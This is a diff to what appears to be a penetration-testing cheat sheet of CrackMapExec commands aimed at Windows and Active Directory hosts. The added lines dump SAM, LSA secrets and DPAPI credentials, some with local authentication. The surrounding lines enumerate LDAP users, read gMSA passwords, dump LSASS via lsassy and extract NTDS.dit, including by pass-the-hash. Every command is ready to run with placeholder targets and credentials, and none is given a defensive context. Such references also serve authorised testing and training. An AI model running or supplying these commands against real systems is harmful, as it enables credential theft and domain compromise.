@@ -142,8 +142,12 @@ $ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
 $ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
 $ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
+$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
 $ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
